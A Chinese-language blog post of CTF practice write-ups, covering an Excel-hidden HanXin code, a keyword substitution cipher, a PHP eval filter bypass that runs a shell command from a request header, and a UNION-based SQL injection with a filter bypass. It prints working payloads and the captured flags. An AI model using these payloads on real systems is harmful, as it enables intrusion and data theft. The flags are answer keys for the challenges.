---
title: 9月
date: 2026-10-06 10:00:00
updated: 2026-10-07 10:00:00
categories:
  - 练习
tags:
  - misc
  - CTF练习
description: 10月在CTF练习平台上做的题目的理解
---

misc
10-06
- 0x01
1. 题目1386 excel骚操作
2. 看到一个excel表格，打开后是空的“我能看见flag，你呢”其实是有掩盖了颜色的字符1在整个画布格子上的
查找替换（CTRL+f）所有的1为黑色框之后得到的为一个类似二维码的hanxin汉信码。
`这个图形实际上是一个 汉信码（HanXin Code）。汉信码同样由黑白方块组成，肉眼看上去很像普通二维码；但汉信码四个角都有定位图案，尺寸公式为 23 + 2 ×（版本号 − 1），因此 33×33 对应汉信码 Version 6。`

不同点：
- QR Code 使用 QR 自己的定位、校正、格式信息和数据排列规则；
- 汉信码有自己的四角定位图形、结构信息区、掩码和纠错规则；
- 用普通 QR 解码器去识别汉信码，就像用 MP3 播放器打开 WAV 文件：看起来都是“音频”，但格式不同。

3. 使用https://toolsbug.github.io/barcode-reader 工具的最后一格解码截图下来的文件即可得到flag

flag{9ee0cb62-f443-4a72-e9a3-43c0b910757e}

总结为：把表格里的二进制矩阵还原为图像，识别其为hanxin码最后解码

crypto
10-06
- 0x01
1. 题目3888 你是我的关键词初级
2. 看到密文字符`IFRURC{X0S_YP3_JX_HBXV0PA}`
关键字替换密码/关键字单表替换密码，对前面替换出来是litctf分析、排除
可以得到：（对密文把关键字写出来之后按顺序写下剩下的字母）
明文表：ABCDEFGHIJKLMNOPQRSTUVWXYZ
密文表：YOUABCDEFGHIJKLMNPQRSTVWXZ

这个关键字是题目分析放大后得到的结果
3. 最后分析对应得到
IFRURC{X0S_YP3_JX_HBXV0PA}
LITCTF{Y0U_AR3_MY_KEYW0RD}

http://www.hiencode.com/keyword.html 这个网页输入后可以直接得到最后的flag，但需要确认是关键字密码
得到flag：LITCTF{Y0U_AR3_MY_KEYW0RD}

web
10-07
- 0x01
1. 题目是2420 简单的PHP
2. 看到源码提示
```
<?php
show_source(__FILE__);
    $code = $_GET['code'];
    if(strlen($code) > 80 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is',$code)){
        die(' Hello');
    }else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
        @eval($code);

    }

?> 
```
说明防御1：黑名单+长度小于等于80
preg_match('/[A-Za-z0-9]|\'|"|`| |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is', $code)
防御2：整个code必须可以简化为一个；
';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)

可以构造出来的值：只有靠 ~高位字节 取反还原出来的那几个函数名字符串，以及 ! 运算出的 false/true。
输入的整个 payload 必须严格是"函数调用套函数调用"的形状

函数使用：
getallheaders() 恰好就是：它不需要参数（满足形状要求），返回的却是请求头——请求头是 HTTP 报文的一部分，完全不经过 ?code= 的那两个正则检查，你爱写什么写什么。

所以需要改变响应头来打配合。
3. 通过yakit来编辑相应头并发送
Web Fuzzer这个功能可以完成
4. 改变左侧的编辑区为：
```
GET /?code=[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); HTTP/1.1
Host: node7.anna.nssctf.cn:27428
User-Agent: Mozilla/5.0
Accept: */*
Hack: cat /nssctfflag
```
get就是输入的那么一堆命令，host是靶机地址，Hack是我们输入执行命令的地方，发现根目录flag藏在一个叫nssctfflag的地方，直接cat可以出结果。

NSSCTF{caa97aab-a38d-4868-b4e4-274d75b84cc0}

10-07
- 0x02
1. sql
2. 看到一个网页，表面上没有其他的信息，根据sql和提示“参数是wllm”判断为SQL注入直接通过get的URL进行
3. 尝试过滤情况：
尝试`?wllm=1#`有信息，闭合可以使用#
`?wllm=1’`有报错
对比`1' #`和`1'a#`发现是过滤空格，用用`/**/`替代空格

4. 得到
被拦截： 空格、`--`、`and`、`=`、`updatexml`、`extractvalue`、`rand`、`substr`、`left`、`handler`、`right`（组合时） 
可放行：`or`、`union`、`select`、`group_concat`、`concat`、`database()`、`information_schema.*`、`mid`、`like`、`if`、`sleep` 

决定使用联合union select这两个语句来实现，
- 爆表名
```
?wllm=-1'/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23
```
得到
Your Login name:LTLT_flag,users
Your Password:3
- 爆列名
```
?wllm=-1'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'LTLT_flag'%23
```
查出 LTLT_flag 表有哪些字段：
Your Login name:id,flag
Your Password:3
- 报flag这一字段的数据
```
?wllm=-1'/**/union/**/select/**/1,group_concat(flag),3/**/from/**/LTLT_flag%23
```
这个输入后发现之后一半的数据`NSSCTF{a3759c3b-426f`，那就继续截断
```
?wllm=-1'/**/union/**/select/**/1,mid(flag,15,25),3/**/from/**/LTLT_flag%23
?wllm=-1'/**/union/**/select/**/1,mid(flag,30,25),3/**/from/**/LTLT_flag%23
```
不用太管具体的长度，直接对上就知道了`-4295-ab34-170`,`7d823c3e5}`

NSSCTF{a3759c3b-426f-4295-ab34-1707d823c3e5}

